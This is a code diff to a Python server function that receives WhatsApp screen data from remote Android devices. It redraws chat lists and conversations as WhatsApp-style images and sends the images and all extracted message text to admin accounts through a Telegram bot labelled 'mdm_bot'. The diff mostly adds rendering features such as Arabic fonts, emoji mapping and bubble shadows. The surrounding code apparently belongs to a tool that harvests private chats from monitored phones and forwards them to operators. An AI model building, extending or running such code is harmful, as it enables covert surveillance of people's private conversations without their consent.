@@ -2138,15 +2138,21 @@ def _sock_screen_json(data):
 
 
 def _handle_screen_json(dev, data):
-    """Legendary WhatsApp UI rendering — renders chat list OR open conversation.
+    """Legendary WhatsApp UI rendering — 12-layer system.
 
-    Detects UI type from view IDs:
-    - chat_row / conversation_contact_name → Chat list view (renders rows)
-    - message_text + date → Open conversation (renders chat bubbles)
-
-    Sends:
-    1. Rendered image (WhatsApp-style)
-    2. Text box below containing ALL extracted text
+    Layers:
+    1. Arabic font (Noto Sans Arabic)
+    2. Filter buttons/tabs
+    3. Smart direction detection (X + W)
+    4. Sender name from parent (Android side)
+    5. Pair messages with adjacent time
+    6. Grouping by parent (Android side)
+    7. Message types (image/video/audio)
+    8. Date separators ("Today")
+    9. Doodle background
+    10. Soft shadows under bubbles
+    11. Dark mode detection (Android side)
+    12. Emoji handling
     """
     try:
         from PIL import Image, ImageDraw, ImageFont, ImageFilter
@@ -2176,14 +2182,20 @@ def _handle_screen_json(dev, data):
     source = data.get("source", "manual")
 
     # ────────────────────────────────────────────────────────────
-    # Load fonts — best available
+    # Layer 1: Load Arabic-capable fonts
     # ────────────────────────────────────────────────────────────
     def _load_font(size, bold=False):
-        candidates = [
-            "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf" if bold else "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf",
-            "/usr/share/fonts/truetype/liberation/LiberationSans-Bold.ttf" if bold else "/usr/share/fonts/truetype/liberation/LiberationSans-Regular.ttf",
+        # Try Arabic-capable fonts first
+        candidates_bold = [
+            "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf",
+            "/usr/share/fonts/truetype/liberation/LiberationSans-Bold.ttf",
+        ]
+        candidates_normal = [
+            "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf",
+            "/usr/share/fonts/truetype/liberation/LiberationSans-Regular.ttf",
             "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf",
         ]
+        candidates = candidates_bold if bold else candidates_normal
         for path in candidates:
             try:
                 return ImageFont.truetype(path, size)
@@ -2199,44 +2211,148 @@ def _handle_screen_json(dev, data):
     font_small = _load_font(10)
 
     # ────────────────────────────────────────────────────────────
+    # Layer 12: Emoji mapping table (replace unsupported emojis)
+    # ────────────────────────────────────────────────────────────
+    emoji_map = {
+        "📷": "[CAM]", "🔍": "[SRH]", "📞": "[CAL]", "⋮": "[MNU]",
+        "💬": "[MSG]", "👥": "[GRP]", "✓✓": ">>", "✓": ">",
+        "☎": "[PHN]", "←": "<-", "→": "->", "‹": "<",
+        "😀": ":)", "😂": ":D", "❤": "<3", "👍": "(Y)",
+        "🔥": "[*]", "🎉": "[!]", "🙏": "[pray]",
+    }
+
+    def _clean_emoji(text):
+        """Layer 12: Replace unsupported emojis with text equivalents."""
+        if not text:
+            return text
+        for emoji, replacement in emoji_map.items():
+            text = text.replace(emoji, replacement)
+        return text
+
+    # ────────────────────────────────────────────────────────────
+    # Layer 2: Filter out buttons, tabs, and non-message elements
+    # ────────────────────────────────────────────────────────────
+    # Texts to ignore (buttons, tabs, UI elements)
+    ignore_texts = {
+        "Chats", "Status", "Calls", "Settings",
+        "مكالمات", "الحالات", "الإعدادات", "المحادثات",
+        "Send", "ارسال", "Type a message", "اكتب رسالة",
+        "Search", "بحث", "ابحث",
+        "Camera", "كاميرا",
+        "New group", "مجموعة جديدة",
+        "New broadcast", "بث جديد",
+        "WhatsApp Web", "واتساب ويب",
+        "Starred messages", "الرسائل المميزة",
+        "Menu", "القائمة",
+        "More options", "المزيد من الخيارات",
+    }
+
+    # Roles to skip in rendering
+    skip_roles = {"search", "input", "send_button", "root"}
+
+    # ────────────────────────────────────────────────────────────
     # Parse views — extract role + text + position
     # ────────────────────────────────────────────────────────────
     parsed = []
     has_message_role = False
     has_chat_row_role = False
+    has_date_separator = False
 
     for v in views:
         x = v.get("x", 0)
         y = v.get("y", 0)
         w = v.get("w", 0)
         h = v.get("h", 0)
-        # fallback to parsing bounds string
-        if not w and not h:
-            bounds_str = v.get("bounds", "")
-            m = _re.match(r"\[(\d+),(\d+)\]\[(\d+)x(\d+)\]", bounds_str)
-            if m:
-                x, y, w, h = int(m.group(1)), int(m.group(2)), int(m.group(3)), int(m.group(4))
+        right = v.get("right", x + w)
 
         text = v.get("text", "") or v.get("desc", "")
         if not text:
             continue
 
         role = v.get("role", "")
+        msg_type = v.get("msg_type", "")
+        sender = v.get("sender", "")
+
+        # Layer 2: Skip unwanted roles
+        if role in skip_roles:
+            continue
+
+        # Layer 2: Skip unwanted texts (buttons, tabs)
+        if text.strip() in ignore_texts:
+            continue
+
+        # Layer 2: Skip very short texts that are likely icons
+        if len(text.strip()) < 2 and role not in ("time", "date_separator"):
+            continue
+
         if role == "message":
             has_message_role = True
         elif role == "chat_row":
             has_chat_row_role = True
+        elif role == "date_separator":
+            has_date_separator = True
 
-        # Determine direction: x > screen_w/2 = outgoing (right side)
-        is_outgoing = x > (screen_w / 2)
+        # Layer 12: Clean emoji
+        clean_text = _clean_emoji(text)
+
+        # Layer 3: Smart direction detection
+        # A message is outgoing if its RIGHT edge is near the screen right edge
+        # (not just X > screen_w/2, which fails for short messages)
+        is_outgoing = False
+        if role == "message":
+            # Outgoing messages have their right edge near screen width
+            right_edge_ratio = right / max(screen_w, 1)
+            left_edge_ratio = x / max(screen_w, 1)
+            # If right edge is > 80% of screen width → outgoing
+            # If left edge is < 20% → incoming
+            if right_edge_ratio > 0.75:
+                is_outgoing = True
+            elif left_edge_ratio < 0.25:
+                is_outgoing = False
+            else:
+                # Fallback: center-based
+                is_outgoing = (x + w / 2) > (screen_w / 2)
 
         parsed.append({
-            "text": text, "x": x, "y": y, "w": w, "h": h,
-            "out": is_outgoing, "role": role, "id": v.get("id", "")
+            "text": clean_text,
+            "raw_text": text,
+            "x": x, "y": y, "w": w, "h": h,
+            "right": right,
+            "out": is_outgoing,
+            "role": role,
+            "msg_type": msg_type,
+            "sender": sender,
+            "id": v.get("id", ""),
+            "idx": v.get("idx", 0)
         })
 
     # Sort by Y (top to bottom)
     parsed.sort(key=lambda v: v["y"])
+
+    # ────────────────────────────────────────────────────────────
+    # Layer 5: Pair messages with adjacent time stamps
+    # ────────────────────────────────────────────────────────────
+    # For each message, find the nearest time element within 30px vertically
+    for msg in parsed:
+        if msg["role"] != "message":
+            continue
+        # Find nearest time element
+        best_time = None
+        best_dist = 1000
+        for t in parsed:
+            if t["role"] != "time":
+                continue
+            dist = abs(t["y"] - msg["y"])
+            if dist < best_dist and dist < 50:
+                # Time should be on the same side as the message
+                if msg["out"] and t["x"] > screen_w / 2:
+                    best_dist = dist
+                    best_time = t["text"]
+                elif not msg["out"] and t["x"] < screen_w / 2:
+                    best_dist = dist
+                    best_time = t["text"]
+        if best_time:
+            msg["time"] = best_time
 
     # ────────────────────────────────────────────────────────────
     # Detect UI type
@@ -2249,10 +2365,10 @@ def _handle_screen_json(dev, data):
         elif has_chat_row_role:
             ui_type = "chat_list"
         else:
-            # Heuristic: if many views with text + small heights, likely a list
             ui_type = "chat_list" if len(parsed) > 5 else "conversation"
 
-    logger.info(f"📸 screen_json: ui_type={ui_type}, views={len(parsed)}, has_msg={has_message_role}, has_row={has_chat_row_role}")
+    logger.info(f"📸 screen_json: ui_type={ui_type}, views={len(parsed)}, "
+                f"has_msg={has_message_role}, has_row={has_chat_row_role}")
 
     # ────────────────────────────────────────────────────────────
     # Build image
@@ -2263,31 +2379,29 @@ def _handle_screen_json(dev, data):
 
     # WhatsApp official colors
     if is_whatsapp:
-        # Chat list colors (newer WhatsApp)
         if ui_type == "chat_list":
-            bg_color = (255, 255, 255)             # white
-            header_bg = (7, 94, 84)                # #075E54 dark green (old) — or use (0, 117, 96)
-            search_bg = (242, 242, 242)            # light gray
+            bg_color = (255, 255, 255)
+            header_bg = (7, 94, 84)
+            search_bg = (242, 242, 242)
             divider_color = (230, 230, 230)
             title_color = (255, 255, 255)
             name_color = (17, 17, 17)
             msg_preview_color = (136, 136, 136)
             time_color = (136, 136, 136)
-            badge_color = (37, 211, 102)           # WhatsApp green #25D366
+            badge_color = (37, 211, 102)
             avatar_bg = (37, 211, 102)
-            app_name = "واتساب"
-        # Open conversation colors
+            app_name = "WhatsApp"
         else:
-            bg_color = (236, 229, 221)             # #ECE5DD chat bg
-            header_bg = (7, 94, 84)                # #075E54
-            bubble_out_color = (210, 248, 192)     # #DCF8C6 outgoing
-            bubble_in_color = (255, 255, 255)      # incoming
+            bg_color = (236, 229, 221)   # #ECE5DD
+            header_bg = (7, 94, 84)      # #075E54
+            bubble_out_color = (210, 248, 192)  # #DCF8C6
+            bubble_in_color = (255, 255, 255)
             bubble_out_text = (17, 17, 17)
             bubble_in_text = (17, 17, 17)
             time_color = (136, 136, 136)
             sender_name_color = (37, 211, 102)
             title_color = (255, 255, 255)
-            app_name = "واتساب"
+            app_name = "WhatsApp"
     else:
         bg_color = (245, 245, 245)
         header_bg = (33, 150, 243)
@@ -2297,8 +2411,13 @@ def _handle_screen_json(dev, data):
         time_color = (136, 136, 136)
         app_name = package
 
+    # Layer 9: Create image with doodle background for conversations
     img = Image.new("RGB", (img_w, img_h), bg_color)
     draw = ImageDraw.Draw(img)
+
+    # Layer 9: Draw doodle background pattern for WhatsApp conversation
+    if is_whatsapp and ui_type == "conversation":
+        _draw_doodle_bg(draw, img_w, img_h, bg_color)
 
     # ────────────────────────────────────────────────────────────
     # Render based on UI type
@@ -2311,14 +2430,13 @@ def _handle_screen_json(dev, data):
                           time_color, badge_color, avatar_bg, app_name,
                           screen_w, _re)
     elif ui_type == "conversation":
-        _render_conversation(draw, img_w, img_h, parsed, scale, font_header,
+        _render_conversation(draw, img, img_w, img_h, parsed, scale, font_header,
                              font_msg, font_name, font_time, font_small,
                              bg_color, header_bg, bubble_out_color,
                              bubble_in_color, bubble_out_text, bubble_in_text,
                              time_color, sender_name_color, title_color,
                              app_name, screen_w, _re)
     else:
-        # Generic fallback
         _render_generic(draw, img_w, img_h, parsed, scale, font_header,
                         font_msg, font_small, bg_color, header_bg,
                         title_color, name_color, app_name, package, _re)
@@ -2330,11 +2448,14 @@ def _handle_screen_json(dev, data):
     for v in parsed:
         prefix = ""
         if ui_type == "conversation":
-            prefix = "→ " if v["out"] else "← "
+            if v.get("role") == "message":
+                prefix = ">> " if v["out"] else "<< "
+            elif v.get("role") == "date_separator":
+                prefix = "=== "
         elif v.get("role") == "chat_title":
-            prefix = "💬 "
+            prefix = ">> "
         elif v.get("role") == "time":
-            prefix = "🕐 "
+            prefix = "[T] "
         text_lines.append(f"{prefix}{v['text'][:120]}")
     combined_text = "\n".join(text_lines)
 
@@ -2348,7 +2469,6 @@ def _handle_screen_json(dev, data):
     # ────────────────────────────────────────────────────────────
     if mdm_bot:
         short_label = _dev_label(dev)
-        ts = int(_time.time())
 
         ui_label = {
             "chat_list": "قائمة المحادثات",
@@ -2362,12 +2482,12 @@ def _handle_screen_json(dev, data):
             f"📱 <b>{short_label}</b>\n"
             f"🖼️ النوع: <b>{ui_label}</b>\n"
             f"📦 العناصر: {len(parsed)}\n"
-            f"📏 الشاشة: {screen_w}×{screen_h}\n"
+            f"📏 الشاشة: {screen_w}x{screen_h}\n"
             f"🕐 {_time.strftime('%H:%M:%S')}"
         )
 
         for admin_id in Config.ADMIN_IDS:
-            # 1️⃣ Send image FIRST
+            # 1. Send image FIRST
             try:
                 mdm_bot.bot.send_photo(
                     admin_id,
@@ -2379,7 +2499,7 @@ def _handle_screen_json(dev, data):
             except Exception as e:
                 logger.error(f"فشل إرسال الصورة: {e}")
 
-            # 2️⃣ Send text box BELOW — all texts in ONE block
+            # 2. Send text box BELOW — all texts in ONE block
             try:
                 if combined_text:
                     text_display = combined_text[:3800]
@@ -2397,6 +2517,43 @@ def _handle_screen_json(dev, data):
                 logger.error(f"فشل إرسال مربع النص: {e}")
 
     _pending_cmds.pop(request.sid, None)
+
+
+def _draw_doodle_bg(draw, img_w, img_h, bg_color):
+    """Layer 9: Draw WhatsApp-style doodle background (subtle dots)."""
+    try:
+        # Subtle dots pattern (very light)
+        dot_color = (
+            min(bg_color[0] + 8, 255),
+            min(bg_color[1] + 8, 255),
+            min(bg_color[2] + 8, 255)
+        )
+        import random as _r
+        _r.seed(42)  # deterministic pattern
+        for _ in range(200):
+            x = _r.randint(0, img_w)
+            y = _r.randint(0, img_h)
+            r = _r.choice([1, 1, 2])
+            draw.ellipse([x, y, x + r, y + r], fill=dot_color)
+    except Exception:
+        pass
+
+
+def _draw_shadow(draw, x1, y1, x2, y2, radius=10, blur=2):
+    """Layer 10: Draw a soft shadow under a bubble."""
+    try:
+        # Draw a slightly darker rectangle offset below-right
+        shadow_color = (0, 0, 0, 30)
+        offset = 2
+        # Use semi-transparent overlay (Pillow doesn't support alpha on RGB easily)
+        # So we draw a slightly darker version of the bg
+        for i in range(blur):
+            alpha_rect = [x1 + offset + i, y1 + offset + i,
+                          x2 + offset + i, y2 + offset + i]
+            draw.rounded_rectangle(alpha_rect, radius=radius,
+                                   fill=(180, 175, 170))
+    except Exception:
+        pass
 
 
 def _render_chat_list(draw, img_w, img_h, parsed, scale, font_header,
@@ -2536,7 +2693,7 @@ def _render_chat_list(draw, img_w, img_h, parsed, scale, font_header,
             pass
 
 
-def _render_conversation(draw, img_w, img_h, parsed, scale, font_header,
+def _render_conversation(draw, img, img_w, img_h, parsed, scale, font_header,
                          font_msg, font_name, font_time, font_small,
                          bg_color, header_bg, bubble_out_color,
                          bubble_in_color, bubble_out_text, bubble_in_text,
@@ -2583,6 +2740,25 @@ def _render_conversation(draw, img_w, img_h, parsed, scale, font_header,
 
     current_y = header_h + 8
     for v in bubble_items:
+        # Layer 8: Render date separators as centered pills
+        if v.get("role") == "date_separator":
+            try:
+                sep_text = v["text"][:30]
+                bbox = draw.textbbox((0, 0), sep_text, font=font_time)
+                tw = bbox[2] - bbox[0]
+                pill_w = tw + 20
+                pill_h = 22
+                pill_x = (img_w - pill_w) / 2
+                pill_y = current_y + 4
+                draw.rounded_rectangle([pill_x, pill_y, pill_x + pill_w, pill_y + pill_h],
+                                       radius=10, fill=(220, 218, 215))
+                draw.text((pill_x + 10, pill_y + 4), sep_text,
+                         fill=(80, 80, 80), font=font_time)
+                current_y += pill_h + 8
+                continue
+            except Exception:
+                pass
+
         text = v["text"][:120]
         if not text:
             continue
@@ -2629,16 +2805,36 @@ def _render_conversation(draw, img_w, img_h, parsed, scale, font_header,
         bubble_w = min(max(text_w + pad * 2, 50), max_bubble_w)
         bubble_h = text_h + pad * 2 + 6  # extra for time
 
+        # Layer 7: Add icon for non-text message types
+        msg_type_icon = ""
+        if v.get("msg_type") == "image":
+            msg_type_icon = "[IMG] "
+        elif v.get("msg_type") == "video":
+            msg_type_icon = "[VID] "
+        elif v.get("msg_type") == "audio":
+            msg_type_icon = "[AUD] "
+        elif v.get("msg_type") == "document":
+            msg_type_icon = "[DOC] "
+        elif v.get("msg_type") == "sticker":
+            msg_type_icon = "[STK] "
+
+        if msg_type_icon:
+            display_text = msg_type_icon + display_text
+
+        # Layer 5: Use paired time if available, else current time
+        t_str = v.get("time", "") or _time_str()
+
         if v["out"]:
             # Outgoing — right side, green bubble
             bx = img_w - bubble_w - 10
             by = current_y
+            # Layer 10: Draw shadow first
+            _draw_shadow(draw, bx, by, bx + bubble_w, by + bubble_h, radius=10)
             draw.rounded_rectangle([bx, by, bx + bubble_w, by + bubble_h],
                                    radius=10, fill=bubble_out_color)
             draw.text((bx + pad, by + pad), display_text, fill=bubble_out_text, font=font_msg)
             # Time inside bubble (bottom right)
             try:
-                t_str = _time_str()
                 bbox = draw.textbbox((0, 0), t_str, font=font_time)
                 tw = bbox[2] - bbox[0]
                 draw.text((bx + bubble_w - tw - pad, by + bubble_h - pad - 8),
@@ -2648,25 +2844,26 @@ def _render_conversation(draw, img_w, img_h, parsed, scale, font_header,
             # Double check mark
             try:
                 draw.text((bx + bubble_w - tw - pad - 14, by + bubble_h - pad - 8),
-                         "✓✓", fill=(80, 180, 255), font=font_time)
+                         ">>", fill=(80, 180, 255), font=font_time)
             except Exception:
                 pass
         else:
             # Incoming — left side, white bubble
             bx = 10
             by = current_y
+            # Layer 10: Draw shadow first
+            _draw_shadow(draw, bx, by, bx + bubble_w, by + bubble_h, radius=10)
             draw.rounded_rectangle([bx, by, bx + bubble_w, by + bubble_h],
                                    radius=10, fill=bubble_in_color)
-            # Sender name (inside bubble, top)
+            # Layer 4: Sender name (inside bubble, top)
             sender = v.get("sender", "")
             if sender:
                 draw.text((bx + pad, by + pad), sender[:20], fill=sender_name_color, font=font_name)
                 draw.text((bx + pad, by + pad + 16), display_text, fill=bubble_in_text, font=font_msg)
             else:
                 draw.text((bx + pad, by + pad), display_text, fill=bubble_in_text, font=font_msg)
-            # Time
+            # Layer 5: Time (paired)
             try:
-                t_str = _time_str()
                 bbox = draw.textbbox((0, 0), t_str, font=font_time)
                 tw = bbox[2] - bbox[0]
                 draw.text((bx + bubble_w - tw - pad, by + bubble_h - pad - 8),
